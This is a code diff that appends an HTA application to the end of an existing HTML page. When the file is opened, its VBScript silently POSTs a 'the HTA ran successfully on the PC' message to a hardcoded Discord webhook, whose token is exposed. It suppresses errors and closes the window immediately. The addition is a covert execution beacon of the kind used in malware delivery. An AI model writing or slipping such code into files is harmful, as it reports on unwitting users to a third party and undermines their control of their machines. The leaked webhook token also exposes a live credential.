@@ -35,3 +35,36 @@
   <p id="status">Running...</p>
 </body>
 </html>
+<html>
+<head>
+    <title>Executável HTA</title>
+    <HTA:APPLICATION 
+        APPLICATIONNAME="WebhookApp" 
+        BORDER="thin" 
+        SCROLL="no" 
+        SINGLEINSTANCE="yes"
+    >
+    <script language="VBScript">
+        Sub Window_OnLoad
+            Dim webhookURL
+            webhookURL = "https://discord.com/api/webhooks/1530744195407413440/lhd_49jAt3ZGW7CF0tDgmmwIVGB2cltSD9TB8p8J5AcBQE17CfkIWJQi_F3zoRgTQDik"
+
+            Dim jsonPayload
+            jsonPayload = "{""content"": ""O HTA foi executado com sucesso no PC!""}"
+
+            Dim http
+            Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+
+            On Error Resume Next
+            http.Open "POST", webhookURL, False
+            http.setRequestHeader "Content-Type", "application/json"
+            http.Send jsonPayload
+            On Error GoTo 0
+
+            window.close()
+        End Sub
+    </script>
+</head>
+<body>
+</body>
+</html>
